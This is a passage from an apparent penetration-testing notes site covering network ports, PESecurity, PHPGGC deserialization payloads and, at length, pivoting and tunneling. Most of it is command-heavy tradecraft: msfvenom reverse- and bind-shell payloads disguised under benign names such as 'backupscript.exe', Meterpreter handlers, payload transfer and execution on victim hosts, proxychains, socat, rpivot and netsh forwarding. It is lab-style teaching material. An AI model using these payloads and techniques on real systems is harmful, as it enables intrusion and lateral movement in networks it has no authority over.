a protocol for devices to discover each other on the network and communicate. PostgreSQL <code>PGSQL</code> <code>5432</code> It is an object-relational database management system. Virtual Network Computing <code>VNC</code> <code>5900</code> It is a graphical desktop sharing system. X Window System <code>X11</code> <code>6000-6063</code> It is a computer software system and network protocol that provides GUI on Unix-like systems. Syslog <code>SYSLOG</code> <code>514</code> It is a standard protocol to collect and store log messages on a computer system. Internet Relay Chat <code>IRC</code> <code>194</code> It is a real-time Internet text messaging (chat) or synchronous communication protocol. OpenPGP <code>OpenPGP</code> <code>11371</code> It is a protocol for encrypting and signing data and communications. Internet Protocol Security <code>IPsec</code> <code>500</code> IPsec is also a protocol that provides secure, encrypted communication. It is commonly used in VPNs to create a secure tunnel between two devices. Internet Key Exchange <code>IKE</code> <code>11371</code> It is a protocol for encrypting and signing data and communications. X Display Manager Control Protocol <code>XDMCP</code> <code>177</code> XDMCP is a network protocol that allows a user to remotely log in to a computer running the X11.","tags":["ports","services","network services"]},{"location":"pesecurity/","title":"PESecurity - A powershell script to check windows binaries compilations","text":"<p>PESecurity is a powershell script that checks if a Windows binary (EXE/DLL) has been compiled with ASLR, DEP, SafeSEH, StrongNaming, Authenticode, Control Flow Guard, and HighEntropyVA.</p>"},{"location":"pesecurity/#installation","title":"Installation","text":"<p>Download from:  https://github.com/NetSPI/PESecurity.</p>"},{"location":"pesecurity/#usage","title":"Usage","text":"<pre><code># To execute Get-PESecurity, first import the module\nImport-Module .\\Get-PESecurity.psm1\n\n# Check a single file\nGet-PESecurity -file C:\\Windows\\System32\\kernel32.dll\n\n# Check a directory for DLLs &amp; EXEs\nGet-PESecurity -directory C:\\Windows\\System32\\\n\n# Check a directory for DLLs &amp; EXEs recrusively\nGet-PESecurity -directory C:\\Windows\\System32\\ -recursive\n\n# Export results as a CSV\nGet-PESecurity -directory C:\\Windows\\System32\\ -recursive | Export-CSV file.csv\n\n# Show results in a table\nGet-PESecurity -directory C:\\Windows\\System32\\ -recursive | Format-Table\n\n# Show results in a table and sort by a column\nGet-PESecurity -directory C:\\Windows\\System32\\ -recursive | Format-Table | sort ASLR\n</code></pre>"},{"location":"phpggc/","title":"Phpggc - A tool for PHP deserialization","text":"<p>PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically.</p> <p>It can be seen as the equivalent of frohoff's ysoserial, but for PHP.</p> <p>Currently, the tool supports gadget chains such as: CodeIgniter4, Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, Wordpress, Yii and ZendFramework.</p>","tags":["webpentesting","tools","deserialization","php"]},{"location":"phpggc/#installation","title":"Installation","text":"<p>Repository: https://github.com/ambionics/phpggc</p> <p>Clone it:</p> <pre><code>git clone https://github.com/ambionics/phpggc.git\n</code></pre> <p>List available gadget chains:</p> <pre><code>cd phpggc\n\n./phpggc -l\n</code></pre> <p>Example from Burpsuite lab:</p> <pre><code>/phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0 &gt; test.txt\n</code></pre>","tags":["webpentesting","tools","deserialization","php"]},{"location":"ping/","title":"Ping","text":"<p>ping works by sending one or more special ICMP packets (Type 8 - echo request) to a host. If the destination host replies with ICMP echo reply packets, then the host is alive.</p> <pre><code>ping www.example.com\nping 8.8.8.8\n</code></pre> <p>Ping sweeping tools automatically perform the same operation to every host in a subnet or IP range. </p>","tags":["scanning","reconnaissance"]},{"location":"pivoting-tunneling-portforwarding/","title":"Pivoting, Tunneling, and Port Forwarding","text":"<p>Lateral movement is a technique that adversaries use, after compromising an endpoint, to extend access to other hosts or applications in an organization.</p> <p>Pivoting's primary use is to defeat segmentation (both physically and virtually) to access an isolated network.\u00a0<code>Tunneling</code>, on the other hand, is a subset of pivoting. Tunneling encapsulates network traffic into another protocol and routes traffic through it.</p>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#basic-concepts","title":"Basic concepts","text":"<p>IP Addressing &amp; NICs: Whether assigned\u00a0<code>dynamically</code>\u00a0or\u00a0<code>statically</code>, the IP address is assigned to a\u00a0<code>Network Interface Controller</code>\u00a0(<code>NIC</code>).  Commonly, the NIC is referred to as a Network Interface Card or Network Adapter. A computer can have multiple NICs (physical and virtual), meaning it can have multiple IP addresses assigned, allowing it to communicate on various networks. </p> <p>Some adapters will have an IPv4 and an IPv6 address assigned in a\u00a0dual-stack configuration\u00a0allowing resources to be reached over IPv4 or IPv6.</p> <p>We will see public IPs on devices that are directly facing the Internet, commonly hosted in DMZs.</p> <p>Routing: Technically any computer can become a router and participate in routing.  A router has a routing table that it uses to forward traffic based on the destination IP address. Sometimes we need to make a pivot host route traffic to another network. One way to do it is through the use of AutoRoute, which allows the attacker machine to have\u00a0<code>routes</code>\u00a0to target networks that are reachable through a pivot host.</p> <p>Stand-alone appliances designated as routers typically will learn routes using a combination of static route creation, dynamic routing protocols, and directly connected interfaces. Any traffic destined for networks not present in the routing table will be sent to the\u00a0<code>default route</code>, which can also be referred to as the default gateway or gateway of last resort.</p>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#footprinting","title":"Footprinting","text":"<p>Check for additional NICs:</p> <pre><code>ifconfig\n</code></pre> <pre><code>ipconfig\n</code></pre> <p>Check out the routing table:</p> <pre><code>netstat -r\n\nip route\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#port-forwarding","title":"Port forwarding","text":"<p><code>Port forwarding</code>\u00a0is a technique that allows us to redirect a communication request from one port to another. Port forwarding uses TCP as the primary communication layer to provide interactive communication for the forwarded port. However, different application layer protocols such as SSH or even\u00a0SOCKS\u00a0(non-application layer) can be used to encapsulate the forwarded traffic.</p>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#local-port-forwarding","title":"Local port forwarding","text":"<p>In this example we will use this tunneling as a way to access locally to a remote postgresql service: </p> <p>1. In the attacking machine:</p> <pre><code>ssh UserNameInVictimMachine@VictimKnownIp -L 1234:localhost:5432 \n# We will listen for incoming connections on our local port 1234. When a client connects to our local port, the SSH client will forward the connection to the remote server on port 22. This allows the local client to access services on the remote server as if they were running on the local machine.\n# We are forwarding traffic from any given local port, for instance 1234, to the port on which PostgreSQL is listening, namely 5432, on the remote server. We therefore specify port 1234 to the left of localhost, and 5432 to the right, indicating the target port.\n</code></pre> <p>2. In another terminal in the attacking machine:</p> <pre><code>sudo apt update &amp;&amp; sudo apt install postgresql postgresql-client-common \n# this will install postgresql in case you don't have it.\n\npsql -U christine -h localhost -p 1234\n# Using our installation of psql, we can now interact with the PostgreSQL service running locally on the target machine:\n# -U: to specify user.\n# -h: to specify localhost. \n# -p 1234 as we are targeting the tunnel we created earlier with SSH, we need to specify which is the port the tunnel is listening on.\n</code></pre> <p>3. Confirming Port Forward with Netstat</p> <pre><code>netstat -antp | grep 1234\n</code></pre> <p>4. Confirming Port Forward with Nmap</p> <pre><code>nmap -v -sV -p1234 localhost\n</code></pre> <p>Forward multiple ports</p> <pre><code>ssh -L 1234:localhost:3306 -L 8080:localhost:80 usernameVictim@VictimKnownIp\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#metasploit-with-proxychains","title":"metasploit with proxychains","text":"<pre><code># Modify the proxychains configuration file located at\u00a0`/etc/proxychains.conf` or  `/etc/proxychains4.conf`. \nsudo nano /etc/proxychains4.conf\n\n# Add\u00a0`socks4 127.0.0.1 1234`\u00a0to the last line \u00a0if it is not already there. \n# Ensure that strict_chain is not commented out;\n# Dynamic_chain and random_chain should be commented out)\n# At the very bottom of the file, under ProxyList, we specify the socks5 (or socks4 ) host and port that we used for our tunnel\n\n# Check out /etc/proxychains4.conf\ntail -4 /etc/proxychains4.conf\n</code></pre> <p>Now, run metasploit:</p> <pre><code>proxychains msfconsole\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#dynamic-port-forwarding","title":"Dynamic Port Forwarding","text":"<p>Unlike local port forwarding and remote port forwarding, which use a specific local and remote port (earlier we used 1234 and 5432, for instance), dynamic port forwarding uses a single local port and dynamically assigns remote ports for each connection.</p>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#ssh-for-port-forwarding","title":"SSH for port forwarding","text":"<p>1. SSH command with the -D option: To use dynamic port forwarding with SSH, you can use the ssh command with the -D option, followed by the local port, the remote host and port, and the remote SSH server. </p> <pre><code>ssh UserNameInVictimMachine@VictimKnownIp -D 1234\n# -D request the SSH server to enable dynamic port forwarding.\n# -N tells SSH not to execute any commands remotely.\n</code></pre> <p>2. Setting up proxychains:  Now we will require a tool that can route any tool's packets over the port\u00a0<code>1234</code>. We can do this using the tool\u00a0<code>proxychains</code>, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers. </p> <pre><code># Modify the proxychains configuration file located at\u00a0`/etc/proxychains.conf` or  `/etc/proxychains4.conf`. \nsudo nano /etc/proxychains4.conf\n\n# Add\u00a0`socks4 127.0.0.1 1234`\u00a0to the last line \u00a0if it is not already there. \n# Ensure that strict_chain is not commented out;\n# Dynamic_chain and random_chain should be commented out)\n# At the very bottom of the file, under ProxyList, we specify the socks5 (or socks4 ) host and port that we used for our tunnel\n\n# Check out /etc/proxychains4.conf\ntail -4 /etc/proxychains4.conf\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#ping-sweep-nmaps-with-proxychains","title":"Ping sweep: nmaps with proxychains","text":"<p>Once you complete the previous steps 1 and 2, you can use nmap with proxychains:</p> <pre><code>proxychains nmap -v -Pn -sT $NewDiscoveredIp\n</code></pre> <p>Tip</p> <p>One more important note to remember here is that we can only perform a\u00a0<code>full TCP connect scan</code>\u00a0over proxychains. The reason for this is that proxychains cannot understand partial packets.</p>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#ping-sweep-for-loop-on-linux-pivot-hosts","title":"Ping Sweep For Loop on Linux Pivot Hosts","text":"<pre><code>ssh UserNameInVictimMachine@VictimKnownIp  \n</code></pre> <pre><code>for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep \"bytes from\" &amp;) ;done\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#ping-sweep-using-powershell","title":"Ping Sweep Using PowerShell","text":"<pre><code>ssh UserNameInVictimMachine@VictimKnownIp  \n</code></pre> <pre><code>1..254 | % {\"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)\"}\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#ping-sweep-for-loop-using-cmd","title":"Ping Sweep For Loop Using CMD","text":"<pre><code>ssh UserNameInVictimMachine@VictimKnownIp  \n</code></pre> <pre><code>for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find \"Reply\"\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#rdp-with-proxychains","title":"RDP with proxychains","text":"<p>With proxychains you can use more services. For instance, xfreerdp:</p> <p>Set the dynamic proxy using ssh portforwarding:</p> <pre><code>ssh UserNameInVictimMachine@VictimKnownIp -D 1234\n\n# Scan the network interface cards in the connection\nip a\n</code></pre> <p>In the discovered  networks range, scan ips. Use proxychain with nmap:</p> <pre><code>proxychains nmap -v -Pn -sT $NewDiscoveredIp/23\n\n# After that scan discovered IPs to find services. \n</code></pre> <p>We have found $NewDiscoveredIp with open port 3389. We know the creds. So, with proxychain we can connect:</p> <pre><code>proxychains xfreerdp /v:$NewDiscoveredIp /u:$username /p:$password\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#module-portfwd-in-metasploit","title":"Module\u00a0<code>portfwd</code> in metasploit","text":"<p>Port forwarding can also be accomplished using Meterpreter's\u00a0<code>portfwd</code>\u00a0module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network</p> <p>1. Create a payload for Ubuntu Pivot Host (our victim's machine 1):</p> <pre><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip -f elf -o backupjob LPORT=8080\n</code></pre> <p>2. Start a multi/handler, also known as a Generic Payload Handler.</p> <pre><code>msfconsole -q\nuse exploit/multi/handler\nset lhost 0.0.0.0\nset lport 8080\nset payload linux/x64/meterpreter/reverse_tcp\nrun\n</code></pre> <p>3. Copy the backupjob binary file to the Ubuntu pivot host over SSH and execute it to gain a Meterpreter session.</p> <pre><code># From kali, we copy the file\nscp backupjob $username@$ip:~/\n\n# Connect to the victim's machine\nssh $username@$ip\nchmod +x backupjob \n\n# And execute it\n./backupjob\n</code></pre> <p>4. Once the meterpreter Session is established, use Metasploit's post-exploitation <code>portfwd</code>\u00a0module:</p> <pre><code># List help\nmeterpreter&gt; help portfwd\n\n# Create Local TCP Relay: it requests the Meterpreter session to start a listener on our attack host's local port (`-l`)\u00a0`3300`\u00a0and forward all the packets to the remote (`-r`) Windows server\u00a0$NewDiscoveredIp\u00a0on\u00a0`3389`\u00a0port (`-p`) via our Meterpreter session\nmeterpreter &gt; portfwd add -l 3300 -p 3389 -r $NewDiscoveredIp\n</code></pre> <p>5. Connect to victim's machine2 from the attacker machine:</p> <pre><code>xfreerdp /v:localhost:3300 /u:$username /p:$password\n\n# use Netstat to view information about the session we recently established\nnetstat -antp\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#module-ping_sweep-in-metasploit","title":"Module <code>ping_sweep</code> in metasploit","text":"<p>Module ping_sweep in metasploit allows us to perform a ping sweep from our meterpreter session to the new discovered subnet (reachable only from that session). </p> <p>1. Create a payload for Ubuntu Pivot Host (our victim's machine 1):</p> <pre><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip -f elf -o backupjob LPORT=8080\n</code></pre> <p>2. Start a multi/handler, also known as a Generic Payload Handler.</p> <pre><code>msfconsole -q\nuse exploit/multi/handler\nset lhost 0.0.0.0\nset lport 8080\nset payload linux/x64/meterpreter/reverse_tcp\nrun\n</code></pre> <p>3. Copy the backupjob binary file to the Ubuntu pivot host over SSH and execute it to gain a Meterpreter session.</p> <pre><code># From kali, we copy the file\nscp backupjob $username@$ip:~/\n\n# Connect to the victim's machine\nssh $username@$ip\nchmod +x backupjob \n\n# And execute it\n./backupjob\n</code></pre> <p>4. Once the meterpreter Session is established, do the ping sweep with the module ping_sweep:</p> <pre><code>meterpreter &gt; run post/multi/gather/ping_sweep RHOSTS=$newDiscoveredIPrange/23\n\n# As a result we will see:\n[*] Performing ping sweep for IP range $newDiscoveredIPrange/23\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#module-autoroute-in-metasploit","title":"Module <code>Autoroute</code> in metasploit","text":"<p>Autoroute module allows you to set routes from a meterpreter session to a discovered subnet in the attacked machine. It allow us pivoting from one subnet to another.</p> <p>1. Create a payload for Ubuntu Pivot Host (our victim's machine 1):</p> <pre><code># From the kali attacker machine\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip -f elf -o backupjob LPORT=8080\n</code></pre> <p>2. Start a multi/handler, also known as a Generic Payload Handler.</p> <pre><code># From the kali attacker machine\nmsfconsole -q\nuse exploit/multi/handler\nset lhost 0.0.0.0\nset lport 8080\nset payload linux/x64/meterpreter/reverse_tcp\nrun\n</code></pre> <p>3. Copy the backupjob binary file to the Ubuntu pivot host over SSH and execute it to gain a Meterpreter session.</p> <pre><code># From kali, we copy the file to the Ubuntu compromised machine\nscp backupjob $username@$ipUbuntuCompromisedmachine:~/\n\n# Connect to the victim's machine\nssh $username@$ipUbuntuCompromisedmachine\nchmod +x backupjob \n\n# And execute it\n./backupjob\n</code></pre> <p>4. Once the meterpreter Session is established, send the session to the background with CTRL-z and in the same terminal use Metasploit's post-exploitation routing module\u00a0<code>socks_proxy</code>\u00a0to configure a local proxy on our attack host.</p> <pre><code>use auxiliary/server/socks_proxy\nset SRVPORT 9050\nset SRVHOST \nset version 4a\nrun\n# This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.\n\n# This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session. Even though the command line has not returned anything you can ask for the jobs in execution with:\njobs\n</code></pre> <p>5. Add a Line to proxychains.conf if needed (in your kali machine).</p> <pre><code>socks4  127.0.0.1 9050\n# Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.\n</code></pre> <p>6. Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. Use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.</p> <pre><code>use post/multi/manage/autoroute\nset SESSION 1\nset SUBNET $NewSubnet\n# Example: set SUBNET 172.16.5.0\nrun\n# this will bind session 1 to the $NewSubnet discovered in the victim's machine 1, doing the pivoting\n\n# It is also possible to add routes with autoroute by running autoroute from the initial Meterpreter session (session 1):\nsessions -i 1\nrun autoroute -s $NewDiscoveredIp/16\n\n# List the active routes:\nrun autoroute -p\n</code></pre> <p>7.  Make sure that you will get back the communications with a reverse proxy:</p> <pre><code>ssh -i id_rsa $username@$ipUbuntuCompromisedmachine -R $ip:8080:0.0.0.0:8000\n</code></pre> <p>8. Finally, use proxychains to route our Nmap traffic via our Meterpreter session.</p> <pre><code>proxychains nmap $NewDiscoveredIp -p3389 -sT -v -Pn\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#reverse-port-forwarding","title":"Reverse Port Forwarding","text":"<p>For better understanding, we will have the following machines:</p> <ul> <li>Attacker machine: Kali, with IP 192.64.166.2</li> <li>0.Victim's machine 1: Meta_3, a ubuntu machine with 2 networks interfaces: 192.64.166.3 and 192.182.147.2</li> <li>Victim's machine 2: Meta_2, a windows machine with nic 192.182.147.3</li> </ul> <p></p>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#ssh-reverse-port-forwarding","title":"SSH Reverse Port Forwarding","text":"<p>Goal: From the kali we will make a RDP connection with Meta_2, the windows machine. </p> <p>For that we will use the Victim's machine 1 as a reverse port forwarding. </p> <pre><code># Syntax\nssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;ipAddressofTarget&gt; -vN\n\n# Translated to our case:\nssh -R 192.182.147.2:8080:0.0.0.0:8000 ubuntu@192.64.166.3 -vN\n# We are using port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#obtain-a-reverse-shell","title":"Obtain a reverse shell","text":"<p>Now we need to create a payload that is going to be triggered in the Victim's machine 2 (the windows one).  First we create it in our kali:</p> <pre><code>msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.182.147.2 -f exe -o backupscript.exe LPORT=8080\n</code></pre> <p>Now we move this malicious file to the victim's machine 2:</p> <pre><code># First we copy it to the Ubuntu machine from our Kali\n scp backupscript.exe ubuntu@192.64.166.3:~/\n\n# Then we connect to the Ubuntu machine\nssh ubuntu@192.64.166.3\n# And make the file executable\nchmod +x backupjob\n# And there we start a http server to serve the copied file to the windows machine:\npython3 -m http.server 8123\n\n# We have access to the windows machine, so we download the malicious file via web browser or even this command:\nInvoke-WebRequest -Uri \"http://192.64.166.3:8123/backupscript.exe\" -OutFile \"C:\\backupscript.exe\"\n</code></pre> <p>Now, we start a listener in our kali:</p> <pre><code>msfconsole -q\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_https\nset lhost 0.0.0.0\nset lport 8000\nrun\n</code></pre> <p>Now we  execute the payload from the Windows target.</p> <p>We will receive the reverse shell.</p>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#module-portfwd-in-metasploit_1","title":"Module\u00a0<code>portfwd</code> in metasploit","text":"<p>Reverse  port forwarding can also be accomplished using Meterpreter's\u00a0<code>portfwd</code>\u00a0module, \u00a0where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host.</p> <p>We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port\u00a0<code>1234</code>\u00a0to our listener on port\u00a0<code>8081</code>.</p> <pre><code>meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L 192.64.166.3\n</code></pre> <p>1. Configuring &amp; Starting multi/handler</p> <pre><code>meterpreter &gt; set payload windows/x64/meterpreter/reverse_tcp\nset LPORT 8081 \nset LHOST 0.0.0.0 \nrun\n</code></pre> <p>We can now create a reverse shell payload that will send a connection back to our Ubuntu server on\u00a0<code>192.182.147.2</code>:<code>1234</code>\u00a0when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to\u00a0<code>attack host's ip</code>:<code>8081</code>\u00a0that we configured.</p> <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.182.147.2 -f exe -o backupscript.exe LPORT=1234\n</code></pre> <p>Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.</p> <pre><code># #### Establishing the Meterpreter session\n[*] Started reverse TCP handler on 0.0.0.0:8081 \n[*] Sending stage (200262 bytes) to 192.64.166.3\n[*] Meterpreter session 2 opened (192.64.166.3:8081 -&gt; 192.64.166.3:40173 ) at 2022-03-04 15:26:14 -0500\n\n\nmeterpreter &gt; shell\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#socat","title":"Socat","text":"","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#socat-redirection-with-a-reverse-shell","title":"Socat Redirection with a Reverse Shell","text":"<p>Socat\u00a0is a bidirectional relay tool that can create pipe sockets between\u00a0<code>2</code>\u00a0independent network channels without needing to use SSH tunneling.</p> <p>It acts as a redirector that can listen on one host and port and forward that data to another IP address and port.</p> <p>Starting Socat Listener in our attacker machine:</p> <pre><code># Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (192.64.166.3).\nsocat TCP4-LISTEN:8080,fork TCP4:192.64.166.3:80\n# the fork option tells socat to create a new child process for each incoming connection.\n</code></pre> <p>Configuring &amp; Starting the multi/handler. Starting a listener on our attacked host:</p> <pre><code>sudo msfconsole\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_https\nset lhost 0.0.0.0\nset lport 80\nrun\n</code></pre> <p>Create a windows payload</p> <pre><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.64.147.2 -f exe -o backupscript.exe LPORT=8080\n</code></pre> <p>Keep in mind that we must transfer this payload to the Windows host (192.182.147.3) and execute it to obtain the reverse shell.</p>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#socat-redirection-with-a-bind-shell","title":"Socat Redirection with a Bind Shell","text":"<p>Attacker machine: 192.64.166.2 Attacked machine 1:      - 192.64.166.3: A listener in port 8080 that forwards all from 192.182.147.3:8443     - 192.182.147.2:  Attacked machine 2:     - 192.182.147.3:  A listener in port 8443</p> <p>1. Create a bind shell with the windows payload using msfvenom from our attacker machine:</p> <pre><code>msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443\n</code></pre> <p>2. Start a socat bind shell listener, which listens on port 8080 and forwards packets to Windows server 8443. We do this from the attacked machine 1.</p> <pre><code>socat TCP4-LISTEN:8080,fork TCP4:192.182.147.3:8443\n</code></pre> <p>3. Configuring &amp; Starting the Bind multi/handler. We do this from the attacked machine 1.</p> <pre><code>msfconsole -q\n\nuse exploit/multi/handler\nset RHOST 192.64.166.2\nset LPORT 8080\nrun\n\n\n[*] Started bind TCP handler against 192.64.166.2:8080\n...\n...\n# Establishing Meterpreter Session\n[*] Sending stage (200262 bytes) to 192.64.166.2\n[*] Meterpreter session 1 opened (192.64.166.3:46253 -&gt; 192.64.166.2:8080 ) at 2022-03-07 12:44:44 -0500\n\nmeterpreter &gt; getuid\nServer username: INLANEFREIGHT\\victor\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#ssh-for-windows-plinkexe","title":"SSH for Windows: plink.exe","text":"<p>Plink, short for PuTTY Link, is a Windows command-line SSH tool that comes as a part of the PuTTY package when installed. Similar to SSH, Plink can also be used to create dynamic port forwards and SOCKS proxies</p> NIC Attacker machine: windows with putty Attacked machine 2: ubuntu Attacked machine 3: Windows 1 10.10.10.2 10.10.10.3 2 10.10.20.2 10.10.20.3 <pre><code>plink -ssh -D 9050 ubuntu@10.10.10.3\n</code></pre> <p>Another Windows-based tool called\u00a0Proxifier\u00a0can be used to start a SOCKS tunnel via the SSH session we created. Proxifier is a Windows tool that creates a tunneled network for desktop client applications and allows it to operate through a SOCKS or HTTPS proxy and allows for proxy chaining. It is possible to create a profile where we can provide the configuration for our SOCKS server started by Plink on port 9050.</p> <p>After configuring the SOCKS server for\u00a0<code>127.0.0.1</code>\u00a0and port 9050, we can directly start\u00a0<code>mstsc.exe</code>\u00a0to start an RDP session with a Windows target that allows RDP connections.</p>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#ssh-pivoting-with-sshuttle","title":"SSH Pivoting with Sshuttle","text":"NIC Attacker machine: kali Attacked machine 2: ubuntu Attacked machine 3: Windows 1 10.10.10.2/24 10.10.10.3/24 2 10.10.20.2/24 10.10.20.3/24 <p>Sshuttle is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers.</p> <p><code>Sshuttle</code>\u00a0can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle:</p> <p>1. Installing sshuttle</p> <pre><code>sudo apt-get install sshuttle\n</code></pre> <p>2. Running sshuttle</p> <pre><code>sudo sshuttle -r ubuntu@10.10.10.3 10.10.20.0/24 -v \n# With this command, sshuttle creates an entry in our iptables to redirect all traffic to the 172.16.5.0/23 network through the pivot host.\n</code></pre> <p>3. We can now use any tool directly without using proxychains.</p> <pre><code>nmap -v -sV -p3389 10.10.20.3 -A -Pn\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#web-server-pivoting-with-rpivot","title":"Web Server Pivoting with Rpivot","text":"","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#pivoting-to-access-a-web-server-on-an-internal-network","title":"Pivoting to access a web server on an internal network","text":"<p>Rpivot\u00a0is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side.</p> NIC Attacker machine: kali Attacked machine 1: ubuntu Attacked machine 2: Windows 1 10.10.10.2/24 2 10.10.50.2/24 3 172.10.20.2/24 172.10.20.3/24 <p>And an External Network at 10.10.40.0</p> <p>We will take the scenario above, where we have a web server on our internal network (<code>172.10.20.135</code>), and we want to access that using the rpivot proxy.</p> <p>1. Install rpivot in kali attacker machine:</p> <pre><code>git clone https://github.com/klsecservices/rpivot.git\n</code></pre> <p>2. Run server.py  with python2.7 from the kali attacker machine:</p> <pre><code>cd rpivot\n\npython2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0\n</code></pre> <p>3. Transfer rpivot folder to the target, the attacked machine 1: ubuntu.</p> <pre><code>scp -r rpivot ubuntu@10.10.50.2:/home/ubuntu/\n</code></pre> <p>4. Run client.py from the pivot target (attacked machine 1: ubuntu):</p> <pre><code>~/rpivot$ python2.7 client.py --server-ip 10.10.10.2 --server-port 9999\n\n# We will see a connection\nNew connection from host 10.10.50.2, source port 35226\n</code></pre> <p>5. Configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attacker machine, which was initially started by the Python server.</p> <pre><code>sudo nano /etc/proxychains4.conf\n# Adding `socks5 127.0.0.1 9050` in the last line\n</code></pre> <p>6. Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.</p> <pre><code>proxychains firefox-esr 172.10.20.135:80\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#pivoting-to-access-an-external-server-attack-host-on-the-cloud","title":"Pivoting to access an external server (attack host) on the cloud","text":"<p>here could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have\u00a0HTTP-proxy with NTLM authentication\u00a0configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way.</p> <p>Client NTLM authentication example</p> <p></p> <p>1. Connect to a Web Server using HTTP-Proxy &amp; NTLM Auth</p> <pre><code>python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip &lt;IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;\n</code></pre>","tags":["pentesting"]},{"location":"pivoting-tunneling-portforwarding/#port-forwarding-with-windows-netsh","title":"Port Forwarding with Windows Netsh","text":"<p>Netsh\u00a0is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use\u00a0<code>Netsh</code>\u00a0for:</p> <ul> <li><code>Finding routes</code></li> <li><code>Viewing the firewall configuration</code></li> <li><code>Adding proxies</code></li> <li><code>Creating port forwarding rules</code></li> </ul> <p>We can use\u00a0<code>netsh.exe</code>\u00a0to forward all data received on a specific port (say 8080) to a remote host on a remote port. </p> <p>This can be performed entering in the Windows machine (Windows-based pivot host) and using the below command.</p> <pre><code>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=$IpInterface1 connectport=3389 connectaddress=$IpInterface2\n</code></pre> <p>Now we can connect to the 8080 port of the Windows machine (Windows-based pivot host) from our kali attacking machine using xfreerdp:</p> <pre><code>xfreerdp /v:$IpInterface1:8080 /u:$username 